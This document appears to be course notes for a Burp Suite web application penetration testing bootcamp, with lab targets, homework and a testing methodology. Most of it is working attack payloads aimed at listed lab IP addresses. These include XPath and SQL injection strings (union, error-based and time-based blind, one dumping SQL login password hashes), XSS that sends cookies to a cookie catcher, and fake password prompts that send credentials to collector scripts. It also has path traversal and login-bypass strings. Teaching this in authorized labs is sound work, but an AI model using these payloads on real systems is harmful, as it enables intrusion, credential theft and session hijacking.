####################
# Course Materials #
####################

Slides:
https://s3.amazonaws.com/StrategicSec-Files/BurpSuiteBootcamp/WebAppSecIsNotEasyButCanBeSimple.pptx
https://s3.amazonaws.com/StrategicSec-Files/BurpSuiteBootcamp/Burp+Suite.pptx


Lab Manual:
https://s3.amazonaws.com/StrategicSec-Files/BurpSuiteBootcamp/BurpSuite-Bootcamp-v1.pdf


Previous class videos:
Previous Day 1 Video:
https://s3.amazonaws.com/StrategicSec-Videos/2015/2015-12-06+09.10+Burp+Suite+Weekend+Bootcamp.mp4

Previous Day 2 Video:
https://s3.amazonaws.com/StrategicSec-Videos/2015/2015-12-13+09.25+Burp+Suite+Weekend+Bootcamp.mp4


Current class video:
Here is the video of the first night's Burp Suite course:
https://s3.amazonaws.com/StrategicSec-Videos/2016/BurpSuite/2016-10-03+19.17+Burp+Suite+Workshop.mp4



Day 1 Homework:
Here is a good reference of how to use Burp to look for OWASP Top 10 vulnerabilities:
https://support.portswigger.net/customer/portal/articles/1969845-using-burp-to-test-for-the-owasp-top-ten


Use Burp Suite to demonstrate with screenshots and explanations of how to test for the all of the OWASP Top 10 vulnerabilities against your choice of targets the following targets:
http://54.213.100.93/ 
http://54.172.112.249/

Submit the results via email in an MS Word document with (naming convention example: YourFirstName-YourLastName-Burp-Suite-Bootcamp-Day1-Homework.docx)

Day 1 Challenge:
Use Burp Suite to demonstrate with screenshots and explanations of how to test for the all of the OWASP Top 10 vulnerabilities against your choice of targets the following targets:
http://strategicsec.com
http://54.213.131.105/

Submit the results via email in an MS Word document with (naming convention example: YourFirstName-YourLastName-Burp-Suite-Bootcamp-Day1-Challenge.docx)


Day 2 Homework:
Here are some sample web app penetration test reports from other companies that you can look at:
https://s3.amazonaws.com/StrategicSec-Files/WebAppSampleReports.zip

I want you to perform a penetration test against http://zero.webappsecurity.com and document the engagement as if it were a real project.


Day 2 Challenge:
----------------------------------
Use the StrategicSec Ubuntu VM to demonstrate how to install, configure, and use at least five (5) of the following Burp Suite extensions from these websites and lists below: 
https://github.com/integrissecurity/carbonator
https://github.com/allfro/BurpKit
https://github.com/nccgroup/BurpSuiteLoggerPlusPlus
https://github.com/Quitten/Autorize
https://github.com/codewatchorg/sqlipy
https://github.com/augustd/burp-suite-token-fetcher
https://github.com/augustd/burp-suite-gwt-scan

https://webbreacher.wordpress.com/2015/07/25/my-favorite-burp-suite-extensions/
http://bughunting.guide/the-top-5-burp-suite-extensions/
https://www.codemagi.com/downloads/



You must use them against your choice of targets the following targets:
http://strategicsec.com
http://54.213.100.93/ 
http://54.172.112.249/
http://54.200.178.220/
http://54.213.131.105/

Submit the results via email in an MS Word document with (naming convention example: YourFirstName-YourLastName-Burp-Suite-Bootcamp-Day2-Challenge.docx)



##########
# VMWare #
##########
- For this workshop you'll need the latest version of VMWare Workstation (Windows), Fusion (Mac), or Player.
 
- A 30-day trial of Workstation 11 can be downloaded from here:
- https://my.vmware.com/web/vmware/info/slug/desktop_end_user_computing/vmware_workstation/11_0
 
- A 30-day trial of Fusion 7 can be downloaded from here:
- https://my.vmware.com/web/vmware/info/slug/desktop_end_user_computing/vmware_fusion/7_0
 
- The newest version of VMWare Player can be downloaded from here:
- https://my.vmware.com/web/vmware/free#desktop_end_user_computing/vmware_player/7_0
 
 
- Although you can get the VM to run in VirtualBox, I will not be supporting this configuration for this class.
 
 
##########################
# Download the attack VM #
##########################
https://s3.amazonaws.com/StrategicSec-VMs/StrategicsecUbuntu-v3.zip
user: strategicsec
pass: strategicsec


##################################
# Basic: Web Application Testing #
##################################

Most people are going to tell you reference the OWASP Testing guide.
https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents

I'm not a fan of it for the purpose of actual testing. It's good for defining the scope of an assessment, and defining attacks, but not very good for actually attacking a website.


The key to doing a Web App Assessment is to ask yourself the 3 web questions on every page in the site.
	
	1. Does the website talk to a DB?
		- Look for parameter passing (ex: site.com/page.php?id=4)
		- If yes - try SQL Injection

	2. Can I or someone else see what I type?
		- If yes - try XSS

	3. Does the page reference a file?
		- If yes - try LFI/RFI

Let's start with some manual testing against 54.213.100.93


Start here:
http://54.213.100.93/


There's no parameter passing on the home page so the answer to question 1 is NO.
There is however a search box in the top right of the webpage, so the answer to question 2 is YES.

Try an XSS in the search box on the home page:
<script>alert(123);</script>

Doing this gives us the following in the address bar:
http://54.213.100.93/BasicSearch.aspx?Word=<script>alert(123);</script>

Ok, so we've verified that there is XSS in the search box. 

Let's move on to the search box in the left of the page.

Let's give the newsletter signup box a shot

Moving on to the login page.
http://54.213.100.93/login.aspx

I entered a single quote (') for both the user name and the password. I got the following error:

-----------------------------------------------------------------
 'Users//User[@Name=''' and @Password=''']' has an invalid token.
Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.

Exception Details: System.Xml.XPath.XPathException: 'Users//User[@Name=''' and @Password=''']' has an invalid token.

Source Error:


Line 112:            doc.Load(Server.MapPath("") + @"\AuthInfo.xml");
Line 113:            string credential = "Users//User[@Name='" + UserName + "' and @Password='" + Password + "']";
Line 114:            XmlNodeList xmln = doc.SelectNodes(credential);
Line 115:            //String test = xmln.ToString();            
Line 116:            if (xmln.Count > 0)

-----------------------------------------------------------------


Hmm....System.Xml.XPath.XPathException.....that's not SQL.

WTF is this:
Line 112:            doc.Load(Server.MapPath("") + @"\AuthInfo.xml");




In this case you'll have the trap the request with a proxy like:
- Firefox Tamper Data
- Burp Suite				http://www.portswigger.net/Burp/proxy.html
- WebScarab				https://www.owasp.org/index.php/Category:OWASP_WebScarab_Project
- Rat Proxy				https://code.google.com/p/ratproxy/
- Zap Proxy				https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project
- Paros					http://sourceforge.net/projects/paros/



Let's go back to that page error message.....


Let's check it out:
http://54.213.100.93/AuthInfo.xml

Looks like we found passwords!!!!!!!!!!


Looks like there no significant new functionality after logging in with the stolen credentials.

Going back to the homepage...let's see if we can see anything. Figured I'd click on one of the links


http://54.213.100.93/bookdetail.aspx?id=2


Ok, there is parameter passing (bookdetail.aspx?id=2).

The page name is:		bookdetail.aspx
The parameter name is:		id
The paramber value is:		2


Let's try throwing a single quote (') in there:

http://54.213.100.93/bookdetail.aspx?id=2'


I get the following error:

Unclosed quotation mark after the character string ''.
Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.

Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark after the character string ''.










#############################################################################
# SQL Injection                                                             #
# https://s3.amazonaws.com/StrategicSec-Files/1-Intro_To_SQL_Intection.pptx #
#############################################################################


- Another quick way to test for SQLI is to remove the paramter value

 
#############################
# Error-Based SQL Injection #
#############################
http://54.213.100.93/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--
http://54.213.100.93/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(1))--
http://54.213.100.93/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(2))--
http://54.213.100.93/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(3))--
http://54.213.100.93/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(4))--
http://54.213.100.93/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(N))-- 	NOTE: "N" - just means to keep going until you run out of databases
http://54.213.100.93/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85))--
http://54.213.100.93/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'bookmaster')--
http://54.213.100.93/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'sysdiagrams')--




#############################
# Union-Based SQL Injection #
#############################
http://54.213.100.93/bookdetail.aspx?id=2 order by 100--
http://54.213.100.93/bookdetail.aspx?id=2 order by 50--
http://54.213.100.93/bookdetail.aspx?id=2 order by 25--
http://54.213.100.93/bookdetail.aspx?id=2 order by 10--
http://54.213.100.93/bookdetail.aspx?id=2 order by 5--
http://54.213.100.93/bookdetail.aspx?id=2 order by 6--
http://54.213.100.93/bookdetail.aspx?id=2 order by 7--
http://54.213.100.93/bookdetail.aspx?id=2 order by 8--
http://54.213.100.93/bookdetail.aspx?id=2 order by 9--
http://54.213.100.93/bookdetail.aspx?id=2 union all select 1,2,3,4,5,6,7,8,9--

	We are using a union select statement because we are joining the developer's query with one of our own.
	Reference: 
	http://www.techonthenet.com/sql/union.php
	The SQL UNION operator is used to combine the result sets of 2 or more SELECT statements. 
	It removes duplicate rows between the various SELECT statements.

	Each SELECT statement within the UNION must have the same number of fields in the result sets with similar data types.

http://54.213.100.93/bookdetail.aspx?id=-2 union all select 1,2,3,4,5,6,7,8,9--

	Negating the paramter value (changing the id=2 to id=-2) will force the pages that will echo back data to be displayed.

http://54.213.100.93/bookdetail.aspx?id=-2 union all select 1,user,@@version,4,5,6,7,8,9--
http://54.213.100.93/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,7,8,9--
http://54.213.100.93/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,db_name(0),8,9--
http://54.213.100.93/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,master.sys.fn_varbintohexstr(password_hash),8,9 from master.sys.sql_logins--





- Another way is to see if you can get the backend to perform an arithmetic function
http://54.213.100.93/bookdetail.aspx?id=(2)	
http://54.213.100.93/bookdetail.aspx?id=(4-2)	
http://54.213.100.93/bookdetail.aspx?id=(4-1)



http://54.213.100.93/bookdetail.aspx?id=2 or 1=1-- 
http://54.213.100.93/bookdetail.aspx?id=2 or 1=2-- 
http://54.213.100.93/bookdetail.aspx?id=1*1 
http://54.213.100.93/bookdetail.aspx?id=2 or 1 >-1# 
http://54.213.100.93/bookdetail.aspx?id=2 or 1<99# 
http://54.213.100.93/bookdetail.aspx?id=2 or 1<>1# 
http://54.213.100.93/bookdetail.aspx?id=2 or 2 != 3-- 
http://54.213.100.93/bookdetail.aspx?id=2 &0#





###############################
# Blind SQL Injection Testing #
###############################
Time-Based BLIND SQL INJECTION - EXTRACT DATABASE USER
  	 
3 - Total Characters
http://54.213.100.93/bookdetail.aspx?id=2; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
http://54.213.100.93/bookdetail.aspx?id=2; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
http://54.213.100.93/bookdetail.aspx?id=2; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'-- 		(Ok, the username is 3 chars long - it waited 10 seconds)

Let's go for a quick check to see if it's DBO
http://54.213.100.93/bookdetail.aspx?id=2; IF ((USER)='dbo') WAITFOR DELAY '00:00:10'--

Yup, it waited 10 seconds so we know the username is 'dbo' - let's give you the syntax to verify it just for fun.

D  - 1st Character
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'-- 	
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'-- 	(Ok, first letter is a 100 which is the letter 'd' - it waited 10 seconds)
 
B - 2nd Character
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
 
O - 3rd Character
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>97) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>115) WAITFOR DELAY '00:00:10'--
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>105) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>110) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=109) WAITFOR DELAY '00:00:10'--
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=110) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds










###################################################################
# What is XSS                                                     #
# https://s3.amazonaws.com/StrategicSec-Files/2-Intro_To_XSS.pptx #
###################################################################

OK - what is Cross Site Scripting (XSS)

1. Use Firefox to browse to the following location:

	http://54.172.112.249/xss_practice/

	A really simple search page that is vulnerable should come up. 




2. In the search box type:
	
	<script>alert('So this is XSS')</script>


	This should pop-up an alert window with your message in it proving XSS is in fact possible.
	Ok, click OK and then click back and go back to http://54.172.112.249/xss_practice/


3. In the search box type:
	
	<script>alert(document.cookie)</script>


	This should pop-up an alert window with your message in it proving XSS is in fact possible and your cookie can be accessed.
	Ok, click OK and then click back and go back to http://54.172.112.249/xss_practice/

4. Now replace that alert script with:

	<script>document.location="http://54.172.112.249/xss_practice/cookie_catcher.php?c="+document.cookie</script> 


This will actually pass your cookie to the cookie catcher that we have sitting on the webserver.


5. Now view the stolen cookie at:
	http://54.172.112.249/xss_practice/cookie_stealer_logs.html


The cookie catcher writes to this file and all we have to do is make sure that it has permissions to be written to.






############################
# A Better Way To Demo XSS #
############################


Let's take this to the next level. We can modify this attack to include some username/password collection. Paste all of this into the search box.


Use Firefox to browse to the following location:

	http://54.172.112.249/xss_practice/



Paste this in the search box
----------------------------


Option 1
--------

<script>
password=prompt('Your session is expired. Please enter your password to continue',' '); 
document.write("<img src=\"http://54.172.112.249/xss_practice/passwordgrabber.php?password=" +password+"\">");
</script>


Now view the stolen cookie at:
	http://54.172.112.249/xss_practice/passwords.html



Option 2
--------
<script>
username=prompt('Please enter your username',' ');
password=prompt('Please enter your password',' ');
document.write("<img src=\"http://54.172.112.249/xss_practice/unpw_catcher.php?username="+username+"&password="+password+"\">");
</script>




Now view the stolen cookie at:
http://54.172.112.249/xss_practice/username_password_logs.html




#########################################
# Let's kick it up a notch with ASP.NET #
# http://54.200.178.220/                #
#########################################


The trading Web App is on http://54.200.178.220/


Try the following in the search box:
	<script>alert(123);</script>
	' or 1=1
	' and a=a
	1=1
	Joe'+OR+1=1;--


	<script>alert(123);</script>
	
Open a new tab in firefox and try this:
	http://54.200.178.220/Searchresult.aspx?<script>alert(123);</script>=ScriptName


Try the contact us form.
Open a new tab in firefox and try this:
	http://54.200.178.220/OpenPage.aspx?filename=../../../../../../windows/win.ini

Try this on the inquiry form:
	Joe McCray
	1234567890
	joe@strategicsec.com') waitfor delay '00:00:10'--


Login Box:

	' or 1=1 or ''='
	anything   			(click login instead of pressing enter)



Tamper Data: (notice 2 session IDs)

	AcmeTrading=a4b796687b846dd4a34931d708c62b49; 		SessionID is md5
	IsAdmin=yes; 
	ASP.NET_SessionId=d10dlsvaq5uj1g550sotcg45



Profile - Detail	(tamper data)
	Disposition: form-data; name="ctl00$contentMiddle$HiddenField1"\r\n\r\njoe\r\n
	joe|set


	xss_upload.txt (Upload Bulk Order)
	<script>alert(123);</script>




############################
# Trading Web App with WAF #
# http://54.213.131.105    #
############################


Try the following in the search box:
	<script>alert(123);</script>
	<script>alert(123);</script
	<script>alert(123)
	<script>alert
	<script>
	<script
	<scrip
	<scri
	<scr
	<sc
	<s
	<p
	<
	< s
	Joe'+OR+1=1;--

	
Open a new tab in firefox and try this:
	http://54.213.131.105/Searchresult.aspx?%u003cscript>prompt(123)%u003c/script>=ScriptName


	xss_upload.txt (Upload Bulk Order)
	<script>alert(123);</script>


Login Box:

	' or 1=1 or ''='
	anything


#########################
# Setting up Burp Suite #
#########################
Download latest free version of Burp at http://www.portswigger.net/burp/download.html 
Make sure that  burpsuite_free_v1.6.31.jar is set as executable (chmod +x burpsuite_free_v1.6.31.jar) and then run:

java -jar burpsuite_free_v1.6.31.jar

	- Click the "Proxy" tab
	- Click the "Options" sub tab
	- Click “Edit” in the “Proxy Listeners” section
	- In the “Edit proxy listener” pop up select “Binding Tab” select “loopback only”
	- In the same pop up make sure that the bind port is 8080
	- In the same pop up select the “Certificate” tab
	- Ensure that burp is configured to "generate CA-signed per-host certificates"

Open Firefox
	- Click "Edit"
	- Click “Preferences"
	- Click the "Advanced" tab
	- Click the "Network" sub tab
	- Click the connection "settings" button
	- Click "manual proxy configuration"
		set it to 127.0.0.1 port 8080
		check "Use this proxy server for all protocols"
	- Remove both the "localhost, 127.0.0.1" text from the "No Proxy For:" line


Configure your browser to use Burp as its proxy, and configure Burp's proxy listener to generate CA-signed per-host certificates.

Visit any SSL-protected URL.

On the “This Connection is Untrusted” screen, click on “Add Exception”
Click "Get Certificate", then click "View".

In the “Details” tab, select the root certificate in the tree (PortSwigger CA).

Click "Export" and save the certificate as "BurpCert" on the Desktop.

Close Certificate Viewer dialog and click “Cancel” on the “Add Security Exception” dialog
Go to Edit | Preferences 
Click “Advanced” and go to “Certificates” tab
Click “View Certificates”

Click "Import" and select the certificate file that you previously saved.

On the "Downloading Certificate" dialog, check the box "Trust this CA to identify web sites", and click "OK".

Close all dialogs and restart Firefox



################
# Web Servcies #
################
http://data.serviceplatform.org/wsdl_grabbing/seekda-wsdls.with_ini/36-CurrencyConvertor.wsdl

###############################################################
# Question 1: What is the process that you use when you test? #
###############################################################

Step 1: Automated Testing

Step 1a: Web Application vulnerability scanners
-----------------------------------------------
- Run two (2) unauthenticated vulnerability scans against the target
- Run two (2) authenticated vulnerability scans against the target with low-level user credentials
- Run two (2) authenticated vulnerability scans against the target with admin privileges

The web application vulnerability scanners that I use for this process are (HP Web Inspect, and Acunetix).

A good web application vulnerability scanner comparison website is here:
http://sectoolmarket.com/price-and-feature-comparison-of-web-application-scanners-unified-list.html


Look to see if there are cases where both scanners identify the same vulnerability. Investigate these cases thoroughly, ensure that it is NOT a false positive, and report the issue.

When you run into cases where one (1) scanner identifies a vulnerability that the other scanner does not you should still investigate these cases thoroughly, ensure that it is NOT a false positive, and report the issue.


Be sure to look for scans that take more than 3 or 4 hours as your scanner may have lost its active session and is probably not actually finding real vulnerabilities anymore.


Also, be sure to save the scan results and logs. I usually provide this data to the customer.



Step 1b: Directory Brute Forcer
-------------------------------
I like to run DirBuster or a similar tool. This is great to find hidden gems (backups of the website, information leakage, unreferenced files, dev sites, etc).



Step 2: Manual Testing

Try to do this step while your automated scans are running. Use Burp Suite or the Tamper Data Firefox extension to browse EVERY PAGE of the website (if this is realistic).

Step 2a: Spider/Scan the entire site with Burp Suite
Save the spider and scan results. I usually provide this data to the customer as well.


Step 2b: Browse through the site using the 3 question method
Have Burp Suite on with intercept turned off. Browse the website using the 3 question method that I've taught you in the past. When you find a place in the site where the answer to one of the 3 questions is yes - be sure to look at that individual web request in the target section of Burp Suite, right-click on that particular request and choose 'Send to Intruder'.

Take the appropriate fuzz list from https://github.com/fuzzdb-project/fuzzdb/ and load it into Intruder. A quick tip for each individual payload is to be sure to send the payload both with and without the parameter value.

Here is what I mean:
http://www.site.com/page.aspx?parametername=parametervalue

When you are looking at an individual request - often times Burp Suite will insert the payload in place of the parameter value like this:

http://www.site.com/page.aspx?parametername=[ payload ]

You need to ensure that you send the payload this way, and like this below:

http://www.site.com/page.aspx?parametername=parametervalue[ payload ]

This little hint will pay huge dividends in actually EXPLOITING the vulnerabilities you find instead of just identifying them.







###########################################
# Question 2: How much fuzzing is enough? #
###########################################
There really is no exact science for determining the correct amount of fuzzing per parameter to do before moving on to something else.

Here are the steps that I follow when I'm testing (my mental decision tree) to figure out how much fuzzing to do.


Step 1: Ask yourself the 3 questions per page of the site.

Step 2: If the answer is yes, then go down that particular attack path with a few fuzz strings (I usually do 10-20 fuzz strings per parameter)

Step 3: When you load your fuzz strings - use the following decision tree

	- Are the fuzz strings causing a default error message (example 404)?
		- If this is the case then it is most likely NOT vulnerable

	- Are the fuzz strings causing a WAF or LB custom error message?
		- If this is the case then you need to find an encoding method to bypass


	- Are the fuzz strings causing an error message that discloses the backend type?
		- If yes, then identify DB type and find correct syntax to successfully exploit
		- Some example strings that I use are:
			'
			"
			()       	<----- Take the parameter value and put it in parenthesis
			(5-1)	 	<----- See if you can perform an arithmetic function


	- Are the fuzz strings rendering executable code?
		- If yes, then report XSS/CSRF/Response Splitting/Request Smuggling/etc
		- Some example strings that I use are:
			<b>hello</b>
			<u>hello</u>
			<script>alert(123);</script>
			<script>alert(xss);</script>
			<script>alert('xss');</script>
			<script>alert("xss");</script>